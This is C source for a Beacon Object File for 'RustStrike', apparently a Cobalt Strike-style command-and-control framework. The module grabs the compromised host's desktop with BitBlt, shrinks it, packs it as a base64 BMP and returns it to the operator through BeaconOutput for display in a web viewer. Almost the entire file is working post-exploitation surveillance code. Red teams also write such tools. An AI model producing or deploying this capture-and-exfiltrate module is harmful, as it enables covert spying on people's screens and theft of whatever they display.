/*
 * screenshot BOF for RustStrike — capture the desktop as a BMP (component format).
 *
 *   args: none
 *
 * Drives ScreenshotViewer.vue, which hardcodes `data:image/bmp;base64,` — so
 * the output MUST be a Windows BMP (BITMAPFILEHEADER + BITMAPINFOHEADER +
 * bottom-up BGR pixels), not PNG/JPEG. Output:
 *   === SCREENSHOT: <W>x<H> ===\n
 *   <base64 of the BMP bytes>
 * The frontend regex `=== SCREENSHOT: (\d+)x(\d+) ===\n([\s\S]+)` grabs the
 * dimensions and the base64 body, then builds the data URL.
 *
 * Approach: BitBlt the primary monitor into a 32-bpp DIB section, then
 * downscale (nearest-box) so the BMP fits the core's ~4 MB line buffer — a
 * full 1920x1080 32-bpp BMP is ~8 MB raw → ~11 MB base64, far too big. We cap
 * the longest side at ~1280 px (the BMP then ≲ 1280*720*4 ≈ 3.5 MB → ~4.7 MB
 * base64 worst case, and usually much less after the 3:4 expansion is bounded
 * by the cap). If even the downscaled BMP would overflow, we shrink further.
 *
 * Build (mingw):
 *   gcc -c examples/screenshot.c -o examples/screenshot.x64.o
 */
#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT HDC WINAPI USER32$GetDC(HWND);
DECLSPEC_IMPORT int WINAPI USER32$ReleaseDC(HWND, HDC);
DECLSPEC_IMPORT int WINAPI USER32$GetSystemMetrics(int);
DECLSPEC_IMPORT HDC WINAPI GDI32$CreateCompatibleDC(HDC);
DECLSPEC_IMPORT HBITMAP WINAPI GDI32$CreateCompatibleBitmap(HDC, int, int);
DECLSPEC_IMPORT HGDIOBJ WINAPI GDI32$SelectObject(HDC, HGDIOBJ);
DECLSPEC_IMPORT WINBOOL WINAPI GDI32$BitBlt(HDC, int, int, int, int, HDC, int, int, DWORD);
DECLSPEC_IMPORT WINBOOL WINAPI GDI32$SetStretchBltMode(HDC, int);
DECLSPEC_IMPORT WINBOOL WINAPI GDI32$StretchBlt(HDC, int, int, int, int, HDC, int, int, int, int, DWORD);
DECLSPEC_IMPORT WINBOOL WINAPI GDI32$GetDIBits(HDC, HBITMAP, UINT, UINT, LPVOID, LPBITMAPINFO, UINT);
DECLSPEC_IMPORT WINBOOL WINAPI GDI32$DeleteObject(HGDIOBJ);
DECLSPEC_IMPORT WINBOOL WINAPI GDI32$DeleteDC(HDC);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetProcessHeap(VOID);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError(VOID);
DECLSPEC_IMPORT int __cdecl MSVCRT$_snprintf(char *, size_t, const char *, ...);
DECLSPEC_IMPORT int __cdecl MSVCRT$memset(void *, int, size_t);

#define MAX_B64  (4 * 1024 * 1024)   /* cap the base64 output at ~4 MB */
static const char B64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static int b64encode(const unsigned char *src, int len, char *dst) {
    int o = 0, i = 0;
    for (; i + 2 < len; i += 3) {
        unsigned v = (src[i] << 16) | (src[i+1] << 8) | src[i+2];
        dst[o++] = B64[(v >> 18) & 63];
        dst[o++] = B64[(v >> 12) & 63];
        dst[o++] = B64[(v >> 6) & 63];
        dst[o++] = B64[v & 63];
    }
    int rem = len - i;
    if (rem == 1) {
        unsigned v = src[i] << 16;
        dst[o++] = B64[(v >> 18) & 63];
        dst[o++] = B64[(v >> 12) & 63];
        dst[o++] = '=';
        dst[o++] = '=';
    } else if (rem == 2) {
        unsigned v = (src[i] << 16) | (src[i+1] << 8);
        dst[o++] = B64[(v >> 18) & 63];
        dst[o++] = B64[(v >> 12) & 63];
        dst[o++] = B64[(v >> 6) & 63];
        dst[o++] = '=';
    }
    return o;
}

void go(char *args, int alen) {
    (void)args; (void)alen;

    int scrW = USER32$GetSystemMetrics(0 /*SM_CXSCREEN*/);
    int scrH = USER32$GetSystemMetrics(1 /*SM_CYSCREEN*/);
    if (scrW <= 0 || scrH <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "screenshot: no screen (%dx%d)", scrW, scrH);
        return;
    }

    HDC screen = USER32$GetDC(NULL);
    HDC srcDC = GDI32$CreateCompatibleDC(screen);
    HDC dstDC = GDI32$CreateCompatibleDC(screen);
    HBITMAP srcBmp = GDI32$CreateCompatibleBitmap(screen, scrW, scrH);
    if (!screen || !srcDC || !dstDC || !srcBmp) {
        BeaconPrintf(CALLBACK_ERROR, "screenshot: GDI init failed (%lu)", KERNEL32$GetLastError());
        if (srcBmp) GDI32$DeleteObject(srcBmp);
        if (srcDC) GDI32$DeleteDC(srcDC);
        if (dstDC) GDI32$DeleteDC(dstDC);
        if (screen) USER32$ReleaseDC(NULL, screen);
        return;
    }

    /* Capture the screen into srcBmp (full resolution). */
    HGDIOBJ oldSrc = GDI32$SelectObject(srcDC, srcBmp);
    GDI32$BitBlt(srcDC, 0, 0, scrW, scrH, screen, 0, 0, 0x00CC0020 /*SRCCOPY*/);

    /* Pick a downscaled size whose BMP fits MAX_B64 base64. BMP size for
     * 32-bpp = W*H*4 + 54. base64 ≈ ceil(W*H*4/3)*4/3. We target the BMP
     * body < ~2.9 MB so base64 < ~3.9 MB under MAX_B64. Start from the screen
     * size and halve until it fits. */
    int W = scrW, H = scrH;
    for (;;) {
        unsigned long bmpBytes = (unsigned long)W * (unsigned long)H * 4 + 54;
        unsigned long b64Est = (bmpBytes / 3 + 1) * 4;
        if (b64Est < MAX_B64) break;
        W = W / 2; H = H / 2;
        if (W < 16 || H < 16) { W = 16; H = 16; break; }
    }

    /* Allocate the pixel buffer + the base64 buffer up front. */
    HANDLE heap = KERNEL32$GetProcessHeap();
    unsigned long pixBytes = (unsigned long)W * (unsigned long)H * 4;
    unsigned char *pixels = (unsigned char *) KERNEL32$HeapAlloc(heap, 0, pixBytes + 4096);
    if (!pixels) {
        BeaconPrintf(CALLBACK_ERROR, "screenshot: out of memory (pixels)");
        goto cleanup;
    }

    /* Stretch the full-res capture into a 32-bpp DIB of size WxH. */
    BITMAPINFO bi;
    MSVCRT$memset(&bi, 0, sizeof(bi));
    bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bi.bmiHeader.biWidth = W;
    bi.bmiHeader.biHeight = H;        /* positive => bottom-up DIB */
    bi.bmiHeader.biPlanes = 1;
    bi.bmiHeader.biBitCount = 32;
    bi.bmiHeader.biCompression = 0 /*BI_RGB*/;

    GDI32$SetStretchBltMode(dstDC, 3 /*HALFTONE*/);
    /* GetDIBits into our buffer directly from srcBmp, stretched via dstDC:
     * select srcBmp into dstDC, then GetDIBits reads it at WxH. But srcBmp is
     * full-res; we need to StretchBlt src→dst first. Use a temp dst bitmap. */
    HBITMAP dstBmp = GDI32$CreateCompatibleBitmap(screen, W, H);
    if (!dstBmp) {
        BeaconPrintf(CALLBACK_ERROR, "screenshot: dst bitmap failed (%lu)", KERNEL32$GetLastError());
        KERNEL32$HeapFree(heap, 0, pixels);
        goto cleanup;
    }
    HGDIOBJ oldDst = GDI32$SelectObject(dstDC, dstBmp);
    GDI32$StretchBlt(dstDC, 0, 0, W, H, srcDC, 0, 0, scrW, scrH, 0x00CC0020 /*SRCCOPY*/);
    int got = GDI32$GetDIBits(dstDC, dstBmp, 0, (UINT)H, pixels, &bi, 0 /*DIB_RGB_COLORS*/);
    GDI32$SelectObject(dstDC, oldDst);
    GDI32$DeleteObject(dstBmp);
    if (got == 0) {
        BeaconPrintf(CALLBACK_ERROR, "screenshot: GetDIBits failed (%lu)", KERNEL32$GetLastError());
        KERNEL32$HeapFree(heap, 0, pixels);
        goto cleanup;
    }

    /* Build the BMP file in a heap buffer: FILEHEADER + INFOHEADER + pixels. */
    unsigned long bmpSize = 54 + pixBytes;
    unsigned char *bmp = (unsigned char *) KERNEL32$HeapAlloc(heap, 0, bmpSize);
    if (!bmp) {
        BeaconPrintf(CALLBACK_ERROR, "screenshot: out of memory (bmp)");
        KERNEL32$HeapFree(heap, 0, pixels);
        goto cleanup;
    }
    MSVCRT$memset(bmp, 0, 54);
    bmp[0] = 'B'; bmp[1] = 'M';
    bmp[2] = (unsigned char)(bmpSize & 0xff);
    bmp[3] = (unsigned char)((bmpSize >> 8) & 0xff);
    bmp[4] = (unsigned char)((bmpSize >> 16) & 0xff);
    bmp[5] = (unsigned char)((bmpSize >> 24) & 0xff);
    bmp[10] = 54;                    /* bfOffBits = sizeof(FILEHDR)+INFOHDR */
    bmp[14] = 40;                    /* biSize */
    bmp[18] = (unsigned char)(W & 0xff);
    bmp[19] = (unsigned char)((W >> 8) & 0xff);
    bmp[20] = (unsigned char)((W >> 16) & 0xff);
    bmp[21] = (unsigned char)((W >> 24) & 0xff);
    bmp[22] = (unsigned char)(H & 0xff);
    bmp[23] = (unsigned char)((H >> 8) & 0xff);
    bmp[24] = (unsigned char)((H >> 16) & 0xff);
    bmp[25] = (unsigned char)((H >> 24) & 0xff);
    bmp[26] = 1;                     /* biPlanes */
    bmp[28] = 32;                    /* biBitCount */
    /* biSizeImage at +34 — 0 is valid for BI_RGB, but set it for completeness */
    bmp[34] = (unsigned char)(pixBytes & 0xff);
    bmp[35] = (unsigned char)((pixBytes >> 8) & 0xff);
    bmp[36] = (unsigned char)((pixBytes >> 16) & 0xff);
    bmp[37] = (unsigned char)((pixBytes >> 24) & 0xff);
    for (unsigned long i = 0; i < pixBytes; i++) bmp[54 + i] = pixels[i];
    KERNEL32$HeapFree(heap, 0, pixels);

    /* Base64 the BMP and emit with the === SCREENSHOT: WxH === header. */
    int b64cap = (int)((bmpSize / 3 + 1) * 4) + 64;
    char *out = (char *) KERNEL32$HeapAlloc(heap, 0, b64cap);
    if (!out) {
        BeaconPrintf(CALLBACK_ERROR, "screenshot: out of memory (b64)");
        KERNEL32$HeapFree(heap, 0, bmp);
        goto cleanup;
    }
    int o = MSVCRT$_snprintf(out, b64cap - 1, "=== SCREENSHOT: %dx%d ===\n", W, H);
    o += b64encode(bmp, (int)bmpSize, out + o);
    out[o] = 0;

    BeaconOutput(CALLBACK_OUTPUT, out, o);

    KERNEL32$HeapFree(heap, 0, out);
    KERNEL32$HeapFree(heap, 0, bmp);

cleanup:
    GDI32$SelectObject(srcDC, oldSrc);
    GDI32$DeleteObject(srcBmp);
    GDI32$DeleteDC(srcDC);
    GDI32$DeleteDC(dstDC);
    USER32$ReleaseDC(NULL, screen);
}
